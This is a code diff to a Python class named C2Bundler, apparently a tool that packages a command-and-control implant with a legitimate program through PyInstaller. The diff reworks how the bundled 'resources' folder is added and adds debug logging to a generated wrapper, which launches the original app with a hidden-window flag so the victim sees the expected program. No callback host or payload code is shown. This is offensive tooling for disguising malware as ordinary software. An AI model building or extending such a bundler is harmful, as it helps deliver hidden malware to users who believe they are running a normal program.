@@ -98,14 +98,17 @@ class C2Bundler:
             # cmd.extend(["--windowed"])
             pass
 
-        # Add resources folder if patch mode
+                # Add resources folder if patch mode
         if add_resources and self.resources_dir.exists():
             resources_files = list(self.resources_dir.glob("*"))
             if resources_files:
-                for res_file in resources_files:
-                    if res_file.is_file():
-                        cmd.extend(["--add-data", f"{res_file}:resources"])
-                        print(f"[*] Adding resource: {res_file.name}")
+                # On ajoute le dossier entier via --add-data
+                # Important: Sur Windows, utiliser ; comme séparateur, sur Unix utiliser :
+                separator = ";" if sys.platform.startswith("win") else ":"
+                resources_path = str(self.resources_dir)
+                cmd.extend(["--add-data", f"{resources_path}{separator}resources"])
+                print(f"[*] Adding resources folder: {self.resources_dir}")
+                print(f"[*] Files included: {[f.name for f in resources_files]}")
 
         cmd.append(temp_file)
 
@@ -328,6 +331,7 @@ class C2Bundler:
             "else:",
             "    bundle_dir = Path(__file__).parent",
             "",
+            '# PyInstaller --add-data puts folders in the _MEIPASS root',
             'original_app = bundle_dir / "resources" / "' + original_filename + '"',
             "",
             "def _log(msg):",
@@ -336,19 +340,29 @@ class C2Bundler:
             "        ts = time.strftime('%Y-%m-%d %H:%M:%S')",
             "        with open(log_file, 'a', encoding='utf-8') as f:",
             "            f.write('[' + ts + '] ' + str(msg) + '\\n')",
+            "        print('[WRAPPER] ' + str(msg))",
             "    except:",
             "        pass",
             "",
             "def run_original_app():",
             "    try:",
             "        _log('Starting original app')",
+            "        _log('Looking for: ' + str(original_app))",
+            "        _log('Exists: ' + str(original_app.exists()))",
+            "        _log('Bundle dir: ' + str(bundle_dir))",
+            "        _log('Bundle dir contents: ' + str(list(bundle_dir.glob('*'))))",
             "        if original_app.exists():",
+            "            _log('Found original app, executing')",
             "            if sys.platform.startswith('win'):",
             "                subprocess.Popen([str(original_app)], shell=False, creationflags=0x08000000)",
             "            else:",
             "                subprocess.Popen([str(original_app)], shell=False)",
+            "        else:",
+            "            _log('ERROR: Original app not found at: ' + str(original_app))",
             "    except Exception as e:",
             "        _log('Error: ' + str(e))",
+            "        import traceback",
+            "        _log(traceback.format_exc())",
             "        try:",
             "            if sys.platform.startswith('win'):",
             "                os.startfile(str(original_app))",
